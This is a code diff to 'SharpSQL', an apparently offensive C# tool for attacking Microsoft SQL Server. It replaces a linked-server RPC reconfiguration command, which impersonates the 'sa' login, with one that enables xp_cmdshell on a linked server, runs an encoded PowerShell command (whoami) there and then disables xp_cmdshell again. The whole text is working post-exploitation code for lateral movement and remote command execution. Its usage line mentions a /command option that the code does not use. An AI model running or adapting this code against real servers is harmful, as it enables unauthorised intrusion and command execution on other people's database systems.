@@ -5,14 +5,14 @@ using System.Data.SqlClient;
 
 namespace SharpSQL.Commands
 {
-    public class linkedrpc : ICommand
+    public class linkedxplogin : ICommand
     {
-        public static string CommandName => "linkedrpc";
+        public static string CommandName => "linkedxplogin";
 
         public void Execute(Dictionary<string, string> arguments)
         {
-            Console.WriteLine("[*] Action: Reconfigure Linked SQL Server to Allow RPC connections:");
-            Console.WriteLine("\tSharpSQL.exe rpc /db:DATABASE /server:SERVER /target:TARGET [/sqlauth /user:SQLUSER /password:SQLPASSWORD]\r\n");
+            Console.WriteLine("[*] Action: Execute Encoded PowerShell 'whoami' Command on Linked SQL Server via 'xp_cmdshell':");
+            Console.WriteLine("\tUsage: SharpSQL.exe linkedxp /db:DATABASE /server:SERVER /target:TARGET /command:COMMAND [/sqlauth /user:SQLUSER /password:SQLPASSWORD]\r\n");
 
             string user = "";
             string password = "";
@@ -52,7 +52,7 @@ namespace SharpSQL.Commands
             }
             if (String.IsNullOrEmpty(target))
             {
-                Console.WriteLine("\r\n[X] You must supply a target linked SQL server!\r\n");
+                Console.WriteLine("\r\n[X] You must supply a target server!\r\n");
                 return;
             }
 
@@ -96,18 +96,33 @@ namespace SharpSQL.Commands
                 Environment.Exit(0);
             }
 
-            string execAs = "EXECUTE AS LOGIN = 'sa';";
-            SqlCommand command = new SqlCommand(execAs, connection);
+            string enableAdvOptions = $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [{target}]";
+            SqlCommand command = new SqlCommand(enableAdvOptions, connection);
             SqlDataReader reader = command.ExecuteReader();
             reader.Read();
-            Console.WriteLine("\n[*] Attempting impersonation..");
+            Console.WriteLine("\n[*] Enabling Advanced options..");
             reader.Close();
 
-            string enableRPC = $"EXEC sp_serveroption '{target}', 'rpc', 'true'; EXEC sp_serveroption '{target}', 'rpc out', 'true';";
-            command = new SqlCommand(enableRPC, connection);
+            string enableXP = $"EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{target}]";
+            command = new SqlCommand(enableXP, connection);
             reader = command.ExecuteReader();
             reader.Read();
-            Console.WriteLine($"[*] Successfully Reconfigured {target} to Allow RPC Connections!");
+            Console.WriteLine("[*] Enabling xp_cmdshell..");
+            reader.Close();
+
+            string execCmd = $"EXEC ('xp_cmdshell ''powershell -enc dwBoAG8AYQBtAGkA'';') AT [{target}]";
+            command = new SqlCommand(execCmd, connection);
+            reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("[*] Executing command..");
+            Console.WriteLine("[+] Logged in as: " + reader[0] + $" on {target}");
+            reader.Close();
+
+            string disableXP = $"EXEC ('sp_configure ''xp_cmdshell'', 0; RECONFIGURE;') AT [{target}]";
+            command = new SqlCommand(disableXP, connection);
+            reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("[*] Disabling xp_cmdshell..");
             reader.Close();
 
             connection.Close();
